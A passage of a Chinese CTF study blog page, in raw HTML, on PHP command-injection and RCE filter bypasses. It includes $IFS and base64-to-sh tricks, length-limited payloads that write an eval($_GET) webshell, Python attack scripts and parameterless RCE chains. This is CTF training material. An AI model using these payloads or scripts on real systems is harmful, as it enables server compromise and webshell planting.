flag!&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">                echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">                print_r($a);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        ?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现对flag字符进行了绕过，</p><ul><li>如果输入的 IP 地址中包含特殊符号（如 |()[]{}&#x2F;“）或者一些特殊字符（如 &amp;&#x2F;?*()&lt;空格&gt;），则会输出 “fxck your symbol!”。</li><li>如果输入的 IP 地址中包含空格，则会输出 “fxck your space!”。</li><li>如果输入的 IP 地址中包含 “bash” 字符串，则会输出 “fxck your bash!”。</li><li>如果输入的 IP 地址中包含 “flag” 字符串（不区分大小写），则会输出 “fxck your flag!”。</li><li>最后，无论如何都会执行一个 ping 命令来测试输入的 IP 地址，并输出 ping 的结果。</li></ul><p>解题思路： （1）<strong>创建变量实现字符串拼接</strong>：构造**&#x2F;?<strong><strong>ip</strong></strong>&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$<strong><strong>IFS</strong></strong>$1$a$b.php**即可获取flag 注：此处将变量ab的位置互换是为了绕过字符串匹配（内联执行）</p><p>（2）<strong>通过执行sh命令来执行</strong> （bash被过滤了，不然也可以执行）</p><p>构造**&#x2F;?ip&#x3D;127.0.0.1;echo$<strong><strong>IFS</strong></strong>$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh**</p><p>注：sh是linux中运行shell的命令，bash相当于sh的升级版，sh∈bash</p><h4 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h4><p>1:通配符 <strong>？</strong> *****  进行绕过</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(‘cat f?ag.p?p’)</strong></p><p>2:单引号和双引号绕过</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(‘cat fl””‘ag.ph””p);</strong></p><p>3:反斜杠\绕过</p><p>把特殊字符去掉功能性，单纯表示为字符串</p><p> <strong>echo 1&gt;2</strong></p><p> <strong>1&gt;2</strong></p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(‘cat fl\ag.p\hp’)</strong></p><p>4:特殊变量</p><p>$1到$9,$@和$*  输出为空</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(‘cat fl$1ag.p$9hp’)</strong></p><p>5:内联执行：即自定义字符串，在拼接起来</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;passthru(‘a&#x3D;f;d&#x3D;<strong><strong>ag</strong></strong>;c&#x3D;l;cat $a$c$d’)</strong></p><h4 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h4><p>命令盲注</p><p>页面无法shell反弹或者无法回显，或者没有写入权限，可以尝试命令盲注,根据返回时间来进行判断</p><p>相关命令</p><p>1:sleep</p><p>2:awk NR&#x3D;&#x3D;1   #awk逐行获取数据</p><p>3:cut -c   #逐个获取单个字符</p><p><img src="/img/1722310534824-6.png" alt="img"></p><p>4:if判断语句使用</p><p>If [ $(cat flag.php | awk NR&#x3D;&#x3D;1 | cut -c 1 ) &#x3D;&#x3D; f] then echo “right”;fi</p><h4 id="常见文件读取命令绕过"><a href="#常见文件读取命令绕过" class="headerlink" title="常见文件读取命令绕过"></a>常见文件读取命令绕过</h4><p>1:tac  反向显示；</p><p>**?<strong><strong>cmd</strong></strong>&#x3D;system(“**<strong>tac</strong> <strong>fl\ag.p\hp”);</strong></p><p>2:more  一页一页的显示档案内容；</p><p>3:less   与more类似；</p><p>4:tali   查看末尾几行；</p><p>默认显示最后十行</p><p>5:nl   显示的时候，顺便输出行号；</p><p>6:od   以二进制的方式读取档案内容；</p><p>Ascill转化为字符串的形式</p><p>7:xxd  读取二进制文件；</p><p>类似于010里的左16进制右字符串的形式</p><p>8:sort  主要用于排序文件；</p><p>绝对路径＋sort+flag,php</p><p>9:uniq  报告或删除文件中重复的行；</p><p>10:file -f  报错出具体内容；</p><p>11:grep   在文本中查找指定内容的字符串；</p><p>?cmd&#x3D;passthru(“grep fla fla*”)</p><p>解析：从文本flag里搜索包含“fla”字符串的行</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>1:base64绕过</p><p>将cat flag.php转化为base64编码进行绕过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S=<span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64=base64.b64encode(S)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br></pre></td></tr></table></figure><p>即cat flag.php -&gt; Y2F0IGZsYWcucGhw</p><p>2:base32绕过</p><p>同上述base64一样</p><h4 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h4><h5 id="长度为7绕过"><a href="#长度为7绕过" class="headerlink" title="长度为7绕过"></a>长度为7绕过</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]&lt;<span class="number">7</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要掌握的知识点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;a    <span class="comment">#虽然没有输入但是会创建a这个文件</span></span><br><span class="line">ls -t    <span class="comment">#ls基于基于事件排序（从晚到早）</span></span><br><span class="line">sh a    <span class="comment">#sh会把a里面的每行内容当作命令来执行</span></span><br><span class="line">使用\进行命令拼接    <span class="comment">#l\ s    =    ls</span></span><br><span class="line">base64    <span class="comment">#使用base64编码避免特殊字符</span></span><br></pre></td></tr></table></figure><p>我们需要传入的一句话木马&lt;?php eval($_GET[1]);，经过base64编码后PD9waHAgZXZhbCgkX0dFVFsxXSk7</p><p>即我们所需要执行的语句为<strong>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</strong></p><p>构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1</span>.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;<span class="number">0</span></span><br><span class="line">sh <span class="number">0</span></span><br><span class="line"><span class="comment">#因为涉及到2次写入，所以后面有2个斜杆</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/rce.php?1=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i in f:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="title function_ invoke__">format</span>(i.<span class="title function_ invoke__">strip</span>()))</span><br><span class="line">                requests.<span class="title function_ invoke__">get</span>(url.<span class="title function_ invoke__">format</span>(i.<span class="title function_ invoke__">strip</span>()))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.<span class="title function_ invoke__">get</span>(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="长度为5绕过"><a href="#长度为5绕过" class="headerlink" title="长度为5绕过"></a>长度为5绕过</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和长度为7的一样的解法，但是这里也有其他许多解法，例如反弹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;<span class="number">0</span></span><br><span class="line">&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;<span class="number">1</span>.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;<span class="number">64</span>\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;<span class="number">7</span>\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\</span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\</span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh <span class="number">0</span></span><br><span class="line">sh f            </span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/?cmd=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i in f:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="title function_ invoke__">format</span>(i.<span class="title function_ invoke__">strip</span>()))</span><br><span class="line">        requests.<span class="title function_ invoke__">get</span>(url.<span class="title function_ invoke__">format</span>(i.<span class="title function_ invoke__">strip</span>()))</span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.<span class="title function_ invoke__">get</span>(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="长度为4绕过"><a href="#长度为4绕过" class="headerlink" title="长度为4绕过"></a>长度为4绕过</h5><p>预备知识：</p><p>1：<strong>输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</strong></p><p><img src="/img/1722310534824-7.png" alt="img"></p><p>2：增加字母来限定被用来当作命令和参数的文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;ls</span><br><span class="line">&gt;lss</span><br><span class="line">&gt;lsss</span><br><span class="line">&gt;<span class="number">1</span></span><br><span class="line">*<span class="title function_ invoke__">s</span>       (等同于命令： ls lss lsss)</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534824-8.png" alt="img"></p><p>3:通过rev来倒置输出内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1234</span> &gt; v</span><br><span class="line">*v    （等同于命令：rev v）</span><br></pre></td></tr></table></figure><p>4：通过增加ls的-h（把文件大小显示成1k 1M 等形式）参数来让调整-t（根据时间排序）参数的位置 我们之后需要用到rev 倒置输出</p><p>所以需要列出这样形式的文件名</p><p>0&gt;  t-  sl      </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">0</span>\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534825-9.png" alt="img"></p><p>但是输出有点不尽人意，这里需要使用-h来使t往前拉</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">0</span>\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534825-10.png" alt="img"></p><p>5：用dir来代替ls不换行输出</p><p><img src="/img/1722310534825-11.png" alt="img"></p><p>最后构建payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        (等同于命令：dir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0        (等同于命令：rev v &gt; 0)(0里面的内容位:ls -th &gt;f)</span><br><span class="line">sh 0        (sh执行0里面的内容)</span><br></pre></td></tr></table></figure><h4 id="无参数RCE绕过"><a href="#无参数RCE绕过" class="headerlink" title="无参数RCE绕过"></a>无参数RCE绕过</h4><p>题目特征</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则表达式 [^\W]+((?R)?) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;，而最终结果强等于；时，payload才能进行下一步。</p><p>相关函数介绍</p><p>scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; .idea</span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">1</span>.php</span><br><span class="line">    [<span class="number">4</span>] =&gt; NISACTF.php</span><br><span class="line">    [<span class="number">5</span>] =&gt; test.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><a href="https://so.csdn.net/so/search?q=getcwd&spm=1001.2101.3001.7020">getcwd</a>() :取得当前工作目录</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(getcwd());</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#D:\web\study-test</span></span><br></pre></td></tr></table></figure><p>current() ：返回数组中的单元，默认取第一个值</p><p>next()：返回数组中的单元，默认取第二个值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>];</span><br><span class="line">print_r(<span class="built_in">next</span>($a));</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">&lt;?php</span><br><span class="line">$a = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>];</span><br><span class="line">print_r(current($a));</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#4</span></span><br></pre></td></tr></table></figure><p>array_flip() :交换数组中的键和值，成功时返回交换后的数组 array_rand() :从数组中随机取出一个或多个单元</p><p>array_reverse():将数组内容反转</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#array_flip():将键名值进行对调</span></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">0</span></span><br><span class="line">    [<span class="number">5</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">7</span>] =&gt; <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#array_reverse()</span></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">7</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">5</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#array_rand</span></span><br><span class="line">&lt;?php</span><br><span class="line">$a = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>];</span><br><span class="line">print_r(array_rand($a));</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#1或2或0</span></span><br></pre></td></tr></table></figure><p>localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）</p><p>strrev():用于反转给定字符串。</p><p>dirname() ：函数返回路径中的目录部分。 chdir() ：函数改变当前的目录。</p><p>例题：[GXYCTF2019]禁止套娃</p><p>dirmap扫描，发现.git泄露</p><p><img src="/img/1722310534825-12.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://c9a8fee7-08d6-42c9-acc9-423dfb35eafb.node5.buuoj.cn:<span class="number">81</span>/.git/</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534825-13.png" alt="img"></p><p>发现index.php,如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="scandir-读取"><a href="#scandir-读取" class="headerlink" title="scandir()读取"></a>scandir()读取</h5><p>1：bp抓包，?exp&#x3D;var_dump(localeconv());这里我们能看见第一个string[1]就是一个“.”，这个点是由localeconv()产生的</p><p><img src="/img/1722310534826-14.png" alt="img"></p><p>2：利用<code>current()</code>函数将这个点取出来的，<code>‘.’</code>代表的是当前目录</p><p><img src="/img/1722310534826-15.png" alt="img"></p><p>3：既然current()取第一个值，那么current(localeconv())构造一个<code>‘.’,</code><strong><code>而</code></strong><code>&#39;.&#39;</code> 表示当前目录，<code>scandir(&#39;.&#39;)</code> 将返回当前目录中的文件和子目录，这里我们得知flag所在的文件名就是flag.php</p><p><img src="/img/1722310534826-16.png" alt="img"></p><p>4、然而flag的文件名在比较后端我们可以通过array_reverse()将数组内容反转，让它从倒数第二的位置变成正数第二</p><p><img src="/img/1722310534826-17.png" alt="img"></p><p>5：接下来我们可以选择next()函数来读取flag.php</p><p><img src="/img/1722310534826-18.png" alt="img"></p><p>6:使用highlight_file来读取文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(<span class="built_in">next</span>(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534826-19.png" alt="img"></p><h5 id="session-id-读取"><a href="#session-id-读取" class="headerlink" title="session_id()读取"></a>session_id()读取</h5><h6 id="hex2bin（）读取"><a href="#hex2bin（）读取" class="headerlink" title="hex2bin（）读取"></a>hex2bin（）读取</h6><p>对所要执行的命令进行16进制编码，通过在<strong>Cookie: PHPSESSID&#x3D;””</strong> 添加自己所要执行的命令</p><p>最后在使用hexbin()进行解码就行，从而达到命令执行的效果</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?参数=<span class="built_in">eval</span>(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure><h6 id="直接读取"><a href="#直接读取" class="headerlink" title="直接读取"></a>直接读取</h6><p>还是以上题为例，假如我们知道flag.php的文件时，我们直接读文件</p><p>添加：<strong>Cookie: PHPSESSID&#x3D;flag.php</strong></p><p><img src="/img/1722310534826-20.png" alt="img"></p><h5 id="getallheaders-读取"><a href="#getallheaders-读取" class="headerlink" title="getallheaders()读取"></a>getallheaders()读取</h5><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</p><p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?code=var_dump(end(getallheaders()));    <span class="comment">#print_r,echo</span></span><br></pre></td></tr></table></figure><p><img src="/img/1722310534826-21.png" alt="img"></p><p>sky是自己添加的请求头， end()指向最后一行的sky后的代码，达到phpinfo的目的，然后可以进一步去rce</p><h5 id="get-defined-vars-读取"><a href="#get-defined-vars-读取" class="headerlink" title="get_defined_vars()读取"></a>get_defined_vars()读取</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们可以看出其返回的数组类型的先后顺序为$_GET–&gt;$_POST–&gt;$_COOKIE–&gt;$_FILES</p><p><img src="/img/1722310534826-22.png" alt="img"></p><p>即我们可以多加一个参数来进行命令执行，即执行后面的恶意语句，例子如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /&#x27;</span>);</span><br></pre></td></tr></table></figure><h5 id="chdir-array-rand-读取"><a href="#chdir-array-rand-读取" class="headerlink" title="chdir()&amp;array_rand()读取"></a>chdir()&amp;array_rand()读取</h5><p>实在无法rce，可以进行目录遍历</p><p>结合dirname()列出当前工作目录的父目录中的所有文件和目录:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读根目录:</p><p>ord() 函数和 chr() 函数：只能对第一个字符进行转码，ord() 编码，chr()解码，有概率会解码出斜杠读取根目录</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#print_r(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));</span></span><br><span class="line"><span class="comment">#可以测试一下，有几率读出根目录，本人亲测</span></span><br></pre></td></tr></table></figure><p>读上一级文件名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span 